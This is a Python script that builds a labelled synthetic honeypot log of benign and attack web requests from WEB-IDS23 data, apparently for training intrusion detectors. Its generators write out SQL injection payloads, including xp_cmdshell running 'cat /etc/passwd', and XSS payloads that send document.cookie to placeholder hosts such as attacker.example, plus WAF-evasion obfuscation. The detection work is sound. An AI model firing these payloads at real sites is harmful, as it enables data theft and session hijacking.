#!/usr/bin/env python3
"""
webids23_to_honeypot_log_v5.py

v5 fixes four real issues found by auditing v4's output:

1. DUPLICATION (the big one): v4 measured 72.9% of all rows / 45.9% of
   attack rows as exact uri+request_body duplicates, with some payloads
   (mostly dom_based XSS) repeating up to 39 times. Root cause: some
   generator families had a tiny component space (e.g. dom_based had
   only ~12 possible distinct outputs) being sampled 36k times
   independently -- collisions were near-guaranteed, not a bug in the
   sampling logic itself. Fixed two ways:
     a) Component pools expanded substantially across every family
        (more JS actions, more tags/events, more SQL tables/columns/
        delays/quote-comment combos, random padding components) so the
        space per family is now in the tens of thousands.
     b) Uniqueness is now ENFORCED, not hoped for: each generated
        payload is checked against a run-wide seen-set; on collision it
        retries (up to 25 attempts) with a fresh RNG draw; if still
        colliding after that (should be rare given (a)), a short random
        nonce is appended to guarantee uniqueness, and that row is
        marked "forced_unique_nonce": true so you can audit exactly how
        often the fallback fired (expect ~0).

2. FLAG SEMANTICS: v4's "synthetic_duplicate" flag correctly tracked
   flow-level reuse (same WEB-IDS23 CSV row sampled twice under
   oversampling) but was misread as tracking payload-level duplication,
   which is a different mechanism entirely. v5 keeps
   "synthetic_duplicate" with its original, correct meaning and adds
   "forced_unique_nonce" for the payload-uniqueness fallback above, so
   the two concerns are no longer conflated under one field.

3. USER-AGENT DIVERSITY: v4 had 6 UAs, one of which was literally
   "sqlmap/1.7.11". If UA is ever added as a feature, a model could
   learn "UA==sqlmap -> malicious" instead of payload structure, which
   would look great on this dataset and fail completely against your
   held-out LLM-generated evasion set. v5 uses ~18 UAs with weighted
   sampling so ordinary browser UAs dominate and tool UAs (sqlmap,
   python-requests, nmap) appear at realistic low frequency, not
   uniformly at 1/6th of traffic.

4. SCHEMA NOISE:
     - host formatting is now always "ip:port" (80 for http, 443 for
       https) instead of sometimes including the port and sometimes not
       for the same IP.
     - "request_id" and "source_uid" (which were identical in every
       duplicate-free run) are replaced with two distinct fields:
       "flow_uid" (traces back to the original WEB-IDS23 CSV row,
       constant across any oversampled duplicates of that flow) and
       "dup_index" (0 for the original, 1+ for oversampled copies) --
       no redundant identical-string field.

Everything else (session clustering, WAF-evasion obfuscation, ground-
truth labels, class-balancing strategy, streaming/reservoir sampling,
distribution report) is unchanged from v4. See v4's docstring for the
full methodological note on payload/IP content being a documented
synthetic overlay on real WEB-IDS23 flow metadata.
"""

import argparse
import hashlib
import ipaddress
import json
import random
import resource
import secrets
import sys
import time
from collections import Counter
from pathlib import Path

import pandas as pd

CHUNK_SIZE = 20_000
SESSION_WINDOW_SECONDS = 120
USECOLS = ["uid", "ts", "id.orig_h", "id.resp_h", "service", "attack_type"]
MAX_UNIQUENESS_RETRIES = 25

# --------------------------------------------------------------------------
# Combinatorial payload generators (expanded component pools)
# --------------------------------------------------------------------------

SQLI_QUOTES = ["'", '"']
SQLI_COMMENTS = ["--", "#", "-- -", "/*x*/", "-- comment", "/**/"]
SQLI_TABLES = ["users", "accounts", "admin", "customers", "members", "employees",
               "orders", "products", "sessions", "transactions", "payments", "logs"]
SQLI_COLSETS = [
    ["username", "password"], ["id", "email"], ["name", "secret_key"],
    ["user", "pass_hash"], ["card_number", "cvv"], ["ssn", "dob"],
    ["token", "session_id"], ["role", "permissions"],
]
SQLI_DELAYS = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 15, 20]
SHELL_CMDS = ["whoami", "id", "net user", "dir", "cat /etc/passwd", "ipconfig",
              "ls -la", "ps aux", "type C:\\\\boot.ini", "uname -a"]
BOOL_VALS = list(range(1, 30))


def gen_tautology(rng):
    q, c = rng.choice(SQLI_QUOTES), rng.choice(SQLI_COMMENTS)
    val = rng.choice(["1", "a", "true", "x", "z", "yes"])
    style = rng.choice(["eq", "or_eq_prefix", "numeric"])
    prefix = rng.randint(1, 9999)
    if style == "eq":
        return f"{q} OR {val}={val}{c}"
    if style == "numeric":
        return f"{prefix}{q} OR {rng.randint(1,99)}={rng.randint(1,99) if rng.random()<0.3 else 'ANY'}{c}" \
            if False else f"{prefix} OR {val}={val}{c}"
    return f"{prefix}{q} OR '{val}'='{val}'{c}"


def gen_union_based(rng):
    q, c = rng.choice(SQLI_QUOTES), rng.choice(SQLI_COMMENTS)
    if rng.random() < 0.5:
        table = rng.choice(SQLI_TABLES)
        cols = ",".join(rng.choice(SQLI_COLSETS))
        prefix = str(rng.randint(1, 9999)) if rng.random() < 0.4 else ""
        return f"{prefix}{q} UNION SELECT {cols} FROM {table}{c}"
    n = rng.randint(2, 9)
    nulls = ",".join(["NULL"] * n)
    return f"{q} UNION SELECT {nulls}{c}"


def gen_time_based_blind(rng):
    q, c = rng.choice(SQLI_QUOTES), rng.choice(SQLI_COMMENTS)
    d = rng.choice(SQLI_DELAYS)
    prefix = str(rng.randint(1, 9999)) if rng.random() < 0.3 else ""
    if rng.random() < 0.5:
        return f"{prefix}{q} AND SLEEP({d}){c}"
    h, m = d // 60, d % 60
    return f"{prefix}{q} WAITFOR DELAY '0:{h}:{m:02d}'{c}"


def gen_boolean_blind(rng):
    q, c = rng.choice(SQLI_QUOTES), rng.choice(SQLI_COMMENTS)
    n1, n2 = rng.choice(BOOL_VALS), rng.choice(BOOL_VALS)
    if rng.random() < 0.5:
        return f"{n1}{q} AND {n1}={n1}{c}"
    return f"{n1}{q} AND {n1}={n2}{c}"


def gen_error_based(rng):
    q, c = rng.choice(SQLI_QUOTES), rng.choice(SQLI_COMMENTS)
    style = rng.choice(["orderby", "convert", "cast", "extractvalue", "updatexml"])
    prefix = rng.randint(1, 9999)
    if style == "orderby":
        return f"{prefix}{q} ORDER BY {rng.randint(1,30)}{c}"
    if style == "convert":
        return f"{q} AND {rng.randint(1,9)}=CONVERT(int,(SELECT @@version)){c}"
    if style == "cast":
        return f"{q} AND {rng.randint(1,9)}=CAST((SELECT @@version) AS int){c}"
    if style == "updatexml":
        return f"{q} AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1){c}"
    return f"{q} AND EXTRACTVALUE({rng.randint(1,9)},CONCAT(0x7e,(SELECT @@version))){c}"


def gen_stacked_query(rng):
    q, c = rng.choice(SQLI_QUOTES), rng.choice(SQLI_COMMENTS)
    prefix = rng.randint(1, 9999)
    if rng.random() < 0.5:
        return f"{prefix}; DROP TABLE {rng.choice(SQLI_TABLES)}{c}"
    return f"{q}; EXEC xp_cmdshell('{rng.choice(SHELL_CMDS)}'){c}"


def gen_auth_bypass(rng):
    c = rng.choice(SQLI_COMMENTS)
    user = rng.choice(["admin", "root", "administrator", "superuser", "test",
                        "manager", "support", "sysadmin", "operator"])
    suffix = rng.choice(["", str(rng.randint(1, 99))])
    return f"{user}{suffix}'{c}"


SQLI_GENERATORS = {
    "tautology": gen_tautology,
    "union_based": gen_union_based,
    "time_based_blind": gen_time_based_blind,
    "boolean_blind": gen_boolean_blind,
    "error_based": gen_error_based,
    "stacked_query": gen_stacked_query,
    "auth_bypass": gen_auth_bypass,
}

JS_ACTIONS = [
    "alert(1)", "alert('xss')", "alert(document.cookie)", "confirm(1)",
    "prompt(1)", "alert(document.domain)", "alert(2)", "alert('pwn')",
    "confirm('xss')", "prompt('xss')", "alert(window.location)",
    "console.log(document.cookie)", "alert(navigator.userAgent)",
    "alert(localStorage.length)", "alert(1337)", "alert(document.title)",
]
XSS_TAG_EVENTS = [
    ("img", "onerror", ' src=x'), ("svg", "onload", ' src=1'),
    ("body", "onload", ''), ("input", "onfocus", ' autofocus'),
    ("marquee", "onstart", ''), ("video", "onerror", ' src=x'),
    ("details", "ontoggle", ' open'), ("select", "onfocus", ' autofocus'),
    ("textarea", "onfocus", ' autofocus'), ("audio", "onerror", ' src=x'),
    ("iframe", "onload", ' src=about:blank'), ("form", "onsubmit", ''),
]
EXFIL_DOMAINS = ["attacker.example", "evil.example", "c2.example",
                  "collector.example", "exfil.example", "listener.example"]
EXFIL_PATHS = ["collect", "c", "log", "beacon", "grab", "sink"]
EXFIL_PARAMS = ["c", "data", "d", "token", "ck"]


def gen_reflected(rng):
    style = rng.choice(["script", "tag_event", "anchor", "svg_script"])
    if style == "script":
        return f"<script>{rng.choice(JS_ACTIONS)}</script>"
    if style == "tag_event":
        tag, event, attr = rng.choice(XSS_TAG_EVENTS)
        return f"<{tag}{attr} {event}={rng.choice(JS_ACTIONS)}>"
    if style == "svg_script":
        return f"<svg><script>{rng.choice(JS_ACTIONS)}</script></svg>"
    return f'<a href="javascript:{rng.choice(JS_ACTIONS)}">{rng.choice(["click","here","link","view"])}</a>'


def gen_stored(rng):
    domain, path, param = rng.choice(EXFIL_DOMAINS), rng.choice(EXFIL_PATHS), rng.choice(EXFIL_PARAMS)
    style = rng.choice(["cookie_exfil", "image_exfil", "onload_body", "fetch_exfil"])
    if style == "cookie_exfil":
        return f"<script>document.location='http://{domain}/{path}?{param}='+document.cookie</script>"
    if style == "image_exfil":
        return f"<script>new Image().src='http://{domain}/{path}?{param}='+document.cookie</script>"
    if style == "fetch_exfil":
        return f"<script>fetch('http://{domain}/{path}?{param}='+document.cookie)</script>"
    tag, event, attr = rng.choice(XSS_TAG_EVENTS)
    return f"<{tag}{attr} {event}={rng.choice(JS_ACTIONS)}>"


def gen_dom_based(rng):
    style = rng.choice(["hash_script", "jsuri", "hash_img", "hash_svg"])
    if style == "hash_script":
        return f"#<script>{rng.choice(JS_ACTIONS)}</script>"
    if style == "jsuri":
        return f"javascript:{rng.choice(JS_ACTIONS)}"
    if style == "hash_img":
        return f"#<img src=x onerror={rng.choice(JS_ACTIONS)}>"
    return f"#<svg onload={rng.choice(JS_ACTIONS)}>"


XSS_GENERATORS = {
    "reflected": gen_reflected,
    "stored": gen_stored,
    "dom_based": gen_dom_based,
}

BENIGN_CATEGORIES = ["electronics", "apparel", "home", "toys", "books", "sports",
                      "beauty", "garden", "automotive", "office", "grocery", "pet",
                      "outdoor", "furniture", "kitchen", "stationery"]
BENIGN_ADJECTIVES = ["wireless", "blue", "red", "premium", "compact", "portable",
                      "waterproof", "ergonomic", "adjustable", "foldable",
                      "rechargeable", "lightweight", "durable", "stylish",
                      "affordable", "professional", "classic", "modern",
                      "eco-friendly", "heavy-duty", "mini", "large", "smart",
                      "digital", "vintage", "matte", "glossy", "noise-cancelling",
                      "fast-charging", "handmade", "elegant", "rugged", "sleek",
                      "versatile", "budget", "deluxe", "industrial", "minimalist",
                      "textured", "premium-grade"]
BENIGN_NOUNS = ["mouse", "jacket", "speaker", "shoes", "coffee-maker", "desk-lamp",
                "yoga-mat", "phone-case", "water-bottle", "backpack", "headphones",
                "keyboard", "monitor", "charger", "blanket", "tent", "bicycle",
                "watch", "camera", "printer", "router", "vacuum", "blender",
                "toaster", "umbrella", "wallet", "sunglasses", "notebook",
                "pillow", "rug", "tripod", "speaker-stand", "gloves", "scarf",
                "sneakers", "cutting-board", "planter", "lantern", "cushion",
                "organizer"]
BENIGN_BRANDS = ["acme", "zenith", "nova", "orbit", "vertex", "apex", "lumen",
                  "crest", "nimbus", "ridge", "summit", "echo", "pulse", "drift",
                  "haven", "forge", "spire", "quartz", "ember", "cove"]
# "Hard negative" benign phrases -- realistic search/comment text that
# legitimately contains characters (apostrophes, ampersands, parens,
# commas, percent signs, uppercase) that would otherwise ONLY appear in
# attack payloads. Without these, a classifier can trivially separate
# classes by character set alone (e.g. "contains a quote" or "contains
# an uppercase letter") instead of learning actual attack syntax -- that
# was measured directly: quote_count and comment_token_count were 0.000
# for 100% of benign rows in the first version of this generator, and
# every uppercase letter and space character appeared ONLY in attack
# text. That made RF/LSTM metrics look perfect (AUC-ROC 1.000) for the
# wrong reason. These phrases exist specifically to close that gap.
BENIGN_HARD_NEGATIVE_PHRASES = [
    "O'Brien's Hardware", "Trader Joe's", "Ben & Jerry's", "Salt & Pepper Grill",
    "Bed & Breakfast (Downtown)", "Mac & Cheese", "Rock & Roll Vinyl",
    "Men's Running Shoes (Size 10)", "Women's Jacket, Size M",
    "20% off Summer Sale", "Buy 1, Get 1 Free", "King's Coffee House",
    "Fish & Chips Combo (Large)", "Nordstrom's Outlet", "AT&T Store Locator",
    "P&G Household Bundle", "It's a Small World Toy Set",
    "Barnes & Noble Gift Card", "Macy's Black Friday", "H&M Kids Collection",
    # Error/status messages -- semicolons, colons, dashes, parens, no SQL/XSS keywords
    "Error code: 500 (Internal Server Error) -- see logs for details.",
    "Warning: low stock (3 remaining); reorder recommended.",
    "Status: shipped -- tracking #4821-XJ; ETA 3-5 business days.",
    "Note: price includes tax; shipping calculated at checkout.",
    "Session timeout in 2:00; please save your changes.",
    "Build #1042 failed (exit code 1); see CI log for details.",
    "Order #55821: 2 items, $84.50 total; discount applied.",
    # Code-like / technical fragments -- braces, semicolons, arrows, ops
    "cost = qty * unit_price; if (cost > budget) { flag(); }",
    "config: {retries: 3, timeout: 30}; env=production",
    "route: /api/v2/orders -> handler; auth required",
    "x = a + b; y = c - d; return x * y;",
    "threshold >= 0.8 && confidence <= 1.0",
    "for (i = 0; i < n; i++) { sum += arr[i]; }",
    # Business/contact text -- ampersands, parens, punctuation clusters
    "Contact us at support@company.com or call (555) 123-4567.",
    "Meeting notes 10/25: discussed Q3 <-> Q4 transition plan.",
    "Product SKU# ABC-123; Category: Electronics & Gadgets",
    "Rated 4.5/5 stars -- \"great product, fast shipping!\"",
    "Please review section 3.2(a) of the contract, re: pricing.",
    "Invoice #2024-0091; due 30 days net; late fee 1.5%/mo.",
]
BENIGN_REGION_CODES = ["US", "CA", "GB", "AU", "DE", "FR", "JP", "SG", "PH", "IN"]
BENIGN_CURRENCY_CODES = ["USD", "EUR", "GBP", "JPY", "CAD", "AUD", "PHP"]
BENIGN_SORTS = ["price_asc", "price_desc", "newest", "rating", "relevance", "popularity"]

# Path -> HTTP method a real client would actually use for that endpoint
# (was previously random per-request, which is what broke session realism)
BENIGN_PATH_METHOD = {
    "/search": "GET", "/product": "GET", "/catalog": "GET",
    "/api/items": "POST", "/redirect": "GET", "/browse": "GET",
    "/filter": "GET", "/lookup": "POST",
}
STYLE_PARAM = {
    "search_term": "q", "product_id": "id", "order_lookup": "order",
    "filter_combo": "filter", "pagination": "page", "user_email": "email",
    "date_value": "date", "misc_flag": "flag", "region_currency": "locale",
}

# Each archetype is a plausible ordered path/style sequence for one kind of
# browsing session. A session picks ONE archetype and ONE shared identity
# (same user email, same product interest, same order id) at creation, so
# a multi-request session reads as one coherent visit instead of N
# unrelated random draws that happen to share an IP.
BENIGN_ARCHETYPES = [
    [("/search", "search_term"), ("/product", "product_id"),
     ("/product", "product_id"), ("/catalog", "filter_combo")],
    [("/browse", "filter_combo"), ("/browse", "pagination"),
     ("/browse", "pagination"), ("/product", "product_id")],
    [("/api/items", "order_lookup"), ("/redirect", "order_lookup")],
    [("/redirect", "user_email"), ("/api/items", "user_email"),
     ("/search", "search_term")],
    [("/search", "search_term"), ("/filter", "filter_combo"),
     ("/lookup", "date_value"), ("/product", "product_id")],
    [("/api/items", "region_currency"), ("/search", "search_term"),
     ("/product", "product_id")],
]


PATHS_QUERY = ["/search", "/product", "/catalog", "/api/items", "/redirect",
               "/browse", "/filter", "/lookup"]
PATHS_LOGIN = ["/login", "/account/login", "/admin/login.php", "/api/auth",
               "/signin", "/portal/login"]
PATHS_COMMENT = ["/comment", "/contact", "/feedback", "/api/messages",
                  "/reviews", "/support/ticket"]
PARAM_NAMES = ["id", "q", "search", "query", "redirect", "name", "ref", "term"]

# (user_agent, weight) -- weighted toward ordinary browser traffic
USER_AGENTS = [
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", 20),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36", 12),
    ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36", 12),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15", 14),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36", 10),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0", 10),
    ("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0", 6),
    ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1", 8),
    ("Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36", 6),
    ("Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0 Safari/537.36", 5),
    ("python-requests/2.31.0", 3),
    ("curl/8.4.0", 2),
    ("sqlmap/1.7.11#stable (http://sqlmap.org)", 1),
    ("Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)", 1),
]
UA_CHOICES = [u for u, _ in USER_AGENTS]
UA_WEIGHTS = [w for _, w in USER_AGENTS]

REFERERS = ["", "", "https://www.google.com/", "https://www.bing.com/", "-",
            "https://duckduckgo.com/"]


# --------------------------------------------------------------------------
# Deterministic helpers
# --------------------------------------------------------------------------

def rng_for(*parts: str) -> random.Random:
    seed = int(hashlib.sha256("|".join(parts).encode()).hexdigest(), 16) % (2**32)
    return random.Random(seed)


_RESERVED_NETS = [
    ipaddress.ip_network(n) for n in [
        "0.0.0.0/8", "10.0.0.0/8", "100.64.0.0/10", "127.0.0.0/8",
        "169.254.0.0/16", "172.16.0.0/12", "192.0.0.0/24", "192.0.2.0/24",
        "192.168.0.0/16", "198.18.0.0/15", "198.51.100.0/24",
        "203.0.113.0/24", "224.0.0.0/4", "240.0.0.0/4", "255.255.255.255/32",
    ]
]


def _is_public(ip: ipaddress.IPv4Address) -> bool:
    return not any(ip in net for net in _RESERVED_NETS)


def synthetic_public_ip(seed_key: str) -> str:
    rng = rng_for("ip", seed_key)
    while True:
        candidate = ipaddress.IPv4Address(rng.getrandbits(32))
        if _is_public(candidate):
            return str(candidate)


def obfuscate_sqli(payload: str, rng: random.Random) -> str:
    p = payload
    if rng.random() < 0.5:
        p = "".join(c.upper() if rng.random() < 0.5 else c.lower() for c in p)
    if rng.random() < 0.35:
        p = p.replace(" ", "/**/")
    if rng.random() < 0.25:
        p = p.replace("'", "%27").replace(" ", "%20")
    return p


def obfuscate_xss(payload: str, rng: random.Random) -> str:
    p = payload
    if rng.random() < 0.5:
        p = "".join(c.upper() if rng.random() < 0.5 else c.lower() for c in p)
    if rng.random() < 0.3:
        p = p.replace("<script>", "<scr<script>ipt>")
    if rng.random() < 0.25:
        p = p.replace("<", "%3C").replace(">", "%3E")
    return p


# --------------------------------------------------------------------------
# Row counting / reservoir sampling
# --------------------------------------------------------------------------

def count_rows(path: Path) -> int:
    total = 0
    for chunk in pd.read_csv(path, usecols=["uid"], chunksize=CHUNK_SIZE):
        total += len(chunk.dropna())
    return total


def reservoir_sample(path: Path, target: int, seed: int):
    rng = random.Random(seed)
    reservoir = []
    n = 0
    for chunk in pd.read_csv(path, usecols=USECOLS, chunksize=CHUNK_SIZE):
        chunk = chunk.dropna(subset=["id.orig_h", "id.resp_h"])
        for row in chunk.to_dict("records"):
            n += 1
            if len(reservoir) < target:
                reservoir.append(row)
            else:
                j = rng.randint(0, n - 1)
                if j < target:
                    reservoir[j] = row
    return reservoir


# --------------------------------------------------------------------------
# Entry builders
# --------------------------------------------------------------------------

def iso_ts(row):
    return pd.to_datetime(row["ts"]).strftime("%Y-%m-%dT%H:%M:%SZ")


def session_key_for(row):
    epoch = int(pd.to_datetime(row["ts"]).timestamp())
    bucket = epoch // SESSION_WINDOW_SECONDS
    return f'{row["id.orig_h"]}_{bucket}'


def base_fields(row, rng, session_registry, dup_salt: str):
    session_key = session_key_for(row) + dup_salt
    if session_key not in session_registry:
        session_registry[session_key] = {
            "public_ip": synthetic_public_ip(row["id.orig_h"] + session_key),
            "ua": rng.choices(UA_CHOICES, weights=UA_WEIGHTS, k=1)[0],
            "session_id": hashlib.sha1(session_key.encode()).hexdigest()[:12],
            "seq": 0,
        }
    sess = session_registry[session_key]
    sess["seq"] += 1
    port = "80" if row["service"] == "http" else "443"
    host = f'{synthetic_public_ip(row["id.resp_h"])}:{port}'
    return sess, host


def build_uri_body(payload, rng, body_paths, is_attack: bool):
    style = rng.choice(["query", "body"])
    if style == "query":
        path = rng.choice(PATHS_QUERY)
        param = rng.choice(PARAM_NAMES)
        return "GET", f"{path}?{param}={payload}", ""
    path = rng.choice(body_paths)
    if is_attack:
        field = "username" if body_paths is PATHS_LOGIN else "comment"
        suffix = "&password=x" if body_paths is PATHS_LOGIN else "&name=guest"
    else:
        field, suffix = "q", ""
    return "POST", path, f"{field}={payload}{suffix}"


def generate_unique_attack_payload(rng_seed_parts, generators, obfuscate_fn,
                                    obfuscate_prob, seen_payloads: set):
    """Retries with fresh deterministic RNG draws until a never-before-seen
    payload is produced, or falls back to a forced-unique nonce."""
    for attempt in range(MAX_UNIQUENESS_RETRIES):
        rng = rng_for(*rng_seed_parts, f"attempt{attempt}")
        family = rng.choice(list(generators.keys()))
        payload = generators[family](rng)
        obfuscated = False
        if rng.random() < obfuscate_prob:
            payload = obfuscate_fn(payload, rng)
            obfuscated = True
        if payload not in seen_payloads:
            seen_payloads.add(payload)
            return payload, family, obfuscated, False, rng

    # Fallback: force uniqueness with a short random nonce (rare)
    rng = rng_for(*rng_seed_parts, "fallback")
    family = rng.choice(list(generators.keys()))
    payload = generators[family](rng)
    nonce = secrets.token_hex(4)
    payload = f"{payload}{'--' if generators is SQLI_GENERATORS else '/*'}n{nonce}"
    seen_payloads.add(payload)
    return payload, family, False, True, rng


def ensure_benign_session_state(sess: dict, session_key: str):
    """Lazily assign one archetype + one shared identity per session, the
    first time this session is touched. Every subsequent request in the
    same session advances through the SAME archetype using the SAME
    identity, instead of re-rolling everything independently."""
    if "benign_archetype" in sess:
        return
    rng = rng_for("benign_session", session_key)
    sess["benign_archetype"] = rng.choice(BENIGN_ARCHETYPES)
    use_hard_negative = rng.random() < 0.55  # ~30% of sessions get realistic special-char text
    title_case = rng.random() < 0.35
    if use_hard_negative:
        term = f"{rng.choice(BENIGN_HARD_NEGATIVE_PHRASES)} #{rng.randint(1,999999)}"
    else:
        term = f"{rng.choice(BENIGN_ADJECTIVES)} {rng.choice(BENIGN_NOUNS)} {rng.choice(BENIGN_BRANDS)}"
        if title_case:
            term = term.title()
    sess["benign_identity"] = {
        "email": f"user{rng.randint(1,999999)}@example.com",
        "category": rng.choice(BENIGN_CATEGORIES),
        "term": term,
        "order_id": f"ORD{rng.randint(1000000,9999999)}",
        "product_pool": [f"SKU-{rng.randint(100000,999999)}" for _ in range(8)],
        "page": rng.randint(1, 9999),
        "region": rng.choice(BENIGN_REGION_CODES),
        "currency": rng.choice(BENIGN_CURRENCY_CODES),
    }
    sess["benign_step"] = 0


def benign_step_value(sess: dict, rng: random.Random):
    """Advance one step through this session's archetype and produce the
    (path, method, param, value) for it, using the session's shared
    identity so repeated requests stay thematically consistent.

    Sessions longer than their archetype don't hard-wrap back to step 0
    (that guarantees an exact repeat of an earlier request in the same
    session -- not a rare event, a certainty). Instead, once the
    archetype is exhausted, continuation requests are drawn from a
    varied "still browsing" pool, avoiding (path, style) pairs already
    used in this session where that would trivially repeat a prior value."""
    archetype = sess["benign_archetype"]
    identity = sess["benign_identity"]
    idx = sess["benign_step"]
    sess["benign_step"] += 1

    used = sess.setdefault("benign_used_steps", set())
    if idx < len(archetype):
        path, style = archetype[idx]
    else:
        continuation_pool = [
            ("/product", "product_id"), ("/browse", "pagination"),
            ("/search", "search_term"), ("/catalog", "filter_combo"),
            ("/filter", "filter_combo"), ("/lookup", "date_value"),
            ("/api/items", "region_currency"),
        ]
        fresh = [s for s in continuation_pool if s not in used] or continuation_pool
        path, style = rng.choice(fresh)
    used.add((path, style))
    method = BENIGN_PATH_METHOD[path]
    param = STYLE_PARAM[style]

    if style == "search_term":
        value = f"{identity['term']} {identity['category']}"
    elif style == "product_id":
        value = rng.choice(identity["product_pool"])
    elif style == "order_lookup":
        value = identity["order_id"]
    elif style == "filter_combo":
        value = f"{identity['category']}-{rng.choice(BENIGN_SORTS)}-{rng.randint(1,500)}"
    elif style == "pagination":
        identity["page"] += 1
        value = f"page{identity['page']}"
    elif style == "user_email":
        value = identity["email"]
    elif style == "date_value":
        value = (f"{rng.randint(2018,2026)}-{rng.randint(1,12):02d}-{rng.randint(1,28):02d}"
                  f"T{rng.randint(0,23):02d}:{rng.randint(0,59):02d}")
    elif style == "region_currency":
        value = f"{identity['region']}/{identity['currency']}/{rng.randint(1,999999)}"
    else:
        value = f"{rng.choice(['true','false'])}-{rng.randint(1,9999)}"
    return path, method, param, value


def generate_unique_benign_entry(row, session_registry, dup_index, seed, seen_values):
    """Coherent-first, disambiguate-on-collision: try the session's natural
    next step; if that exact (uri, body) has already appeared anywhere in
    the output (rare -- identity space is large), append a short marked
    disambiguator rather than silently drop coherence."""
    dup_salt = f"_dup{dup_index}" if dup_index else ""
    session_key = session_key_for(row) + dup_salt
    init_rng = rng_for("row", str(row["uid"]), str(seed), str(dup_index), "init")
    if session_key not in session_registry:
        session_registry[session_key] = {
            "public_ip": synthetic_public_ip(row["id.orig_h"] + session_key),
            "ua": init_rng.choices(UA_CHOICES, weights=UA_WEIGHTS, k=1)[0],
            "session_id": hashlib.sha1(session_key.encode()).hexdigest()[:12],
            "seq": 0,
        }
    sess = session_registry[session_key]
    ensure_benign_session_state(sess, session_key)
    sess["seq"] += 1

    port = "80" if row["service"] == "http" else "443"
    host = f'{synthetic_public_ip(row["id.resp_h"])}:{port}'

    value_rng = rng_for("row", str(row["uid"]), str(seed), str(dup_index), "value")
    path, method, param, value = benign_step_value(sess, value_rng)

    forced = False
    for attempt in range(3):
        if method == "GET":
            uri, body = f"{path}?{param}={value}", ""
        else:
            uri, body = path, f"{param}={value}"
        key = uri + "|" + body
        if key not in seen_values:
            seen_values.add(key)
            break
        # Rare collision: keep the coherent value but add a short marked
        # disambiguator instead of silently colliding with another session.
        nonce = secrets.token_hex(3)
        value = f"{value}-{nonce}"
        forced = True
    else:
        seen_values.add(key)

    return sess, host, method, uri, body, value_rng, forced


def make_benign_entry(row, session_registry, dup_index: int, seed, seen_values: set):
    sess, host, method, uri, body, rng, forced = generate_unique_benign_entry(
        row, session_registry, dup_index, seed, seen_values,
    )
    return {
        "time": iso_ts(row),
        "source_ip": sess["public_ip"],
        "host": host,
        "method": method,
        "uri": uri,
        "user_agent": sess["ua"],
        "request_body": body,
        "referer": rng.choice(REFERERS),
        "flow_uid": str(row["uid"]),
        "dup_index": dup_index,
        "session_id": sess["session_id"],
        "session_seq": sess["seq"],
        "label": 0,
        "attack_family": "benign",
        "obfuscated": False,
        "synthetic_duplicate": dup_index > 0,
        "forced_unique_nonce": forced,
    }


def make_attack_entry(row, session_registry, generators, obfuscate_fn,
                       body_paths, obfuscate_prob, dup_index: int,
                       seed, seen_payloads: set):
    payload, family, obfuscated, forced, rng = generate_unique_attack_payload(
        ("row", str(row["uid"]), str(seed), str(dup_index)),
        generators, obfuscate_fn, obfuscate_prob, seen_payloads,
    )
    dup_salt = f"_dup{dup_index}" if dup_index else ""
    sess, host = base_fields(row, rng, session_registry, dup_salt)
    method, uri, body = build_uri_body(payload, rng, body_paths, is_attack=True)

    return {
        "time": iso_ts(row),
        "source_ip": sess["public_ip"],
        "host": host,
        "method": method,
        "uri": uri,
        "user_agent": sess["ua"],
        "request_body": body,
        "referer": rng.choice(REFERERS),
        "flow_uid": str(row["uid"]),
        "dup_index": dup_index,
        "session_id": sess["session_id"],
        "session_seq": sess["seq"],
        "label": 1,
        "attack_family": family,
        "obfuscated": obfuscated,
        "synthetic_duplicate": dup_index > 0,
        "forced_unique_nonce": forced,
    }



def write_rows(rows, kind, out_fh, seed, obfuscate_prob, target, stats: Counter,
                seen_payloads: set):
    session_registry: dict = {}

    def emit(row, dup_index):
        if kind == "benign":
            entry = make_benign_entry(row, session_registry, dup_index, seed, seen_payloads)
        elif kind.startswith("sql"):
            entry = make_attack_entry(row, session_registry, SQLI_GENERATORS,
                                       obfuscate_sqli, PATHS_LOGIN, obfuscate_prob,
                                       dup_index, seed, seen_payloads)
        else:
            entry = make_attack_entry(row, session_registry, XSS_GENERATORS,
                                       obfuscate_xss, PATHS_COMMENT, obfuscate_prob,
                                       dup_index, seed, seen_payloads)
        out_fh.write(json.dumps(entry, ensure_ascii=False) + "\n")
        stats["label_" + str(entry["label"])] += 1
        stats["family_" + entry["attack_family"]] += 1
        stats["duplicate"] += int(entry["synthetic_duplicate"])
        stats["forced_nonce"] += int(entry["forced_unique_nonce"])
        stats["total"] += 1

    for row in rows:
        emit(row, 0)

    remainder = target - len(rows)
    dup_idx = 1
    while remainder > 0:
        for row in rows:
            if remainder <= 0:
                break
            emit(row, dup_idx)
            remainder -= 1
        dup_idx += 1


# --------------------------------------------------------------------------
# Target allocation
# --------------------------------------------------------------------------

def allocate(files_with_counts, family_target):
    total_natural = sum(c for _, _, c in files_with_counts) or 1
    allocations = []
    running = 0
    for i, (path, kind, natural) in enumerate(files_with_counts):
        if i == len(files_with_counts) - 1:
            alloc = family_target - running
        else:
            alloc = round(family_target * natural / total_natural)
            running += alloc
        allocations.append((path, kind, natural, max(alloc, 0)))
